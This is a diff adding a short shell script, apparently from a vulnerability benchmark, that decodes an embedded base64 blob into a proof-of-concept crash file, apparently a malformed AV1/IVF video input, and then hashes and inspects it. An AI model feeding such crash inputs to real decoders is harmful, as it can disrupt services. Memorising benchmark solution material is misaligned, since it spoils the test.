@@ -1,0 +1,5 @@
+set -eu
+printf '%s' 'REtJRgAAIABBVjAxEAAQAB4AAAABAAAABQAAAAAAAAAMAAAAAAAAAAAAAAAKCgAAAAGf/AAwhCAMAAAAAQAAAAAAAAAKCgAAAAGf/AAwhCArAAAAAgAAAAAAAAAyKQ4P9gAQAAAAAEkxLGr0Ahv6G1nXgkcuzSCYf32jX67Bx5eNAubFHKXoKwAAAAMAAAAAAAAAMikOD/YAEAAAAABJMSxq9AIb+htZ14JHLs0gmH99o1+uwceXjQLmxRyl6AMAAAAEAAAAAAAAABoBgA==' | base64 -d > /CybinGym_workdir/poc_crash
+sha256sum /CybinGym_workdir/poc_crash
+wc -c /CybinGym_workdir/poc_crash
+file /CybinGym_workdir/poc_crash
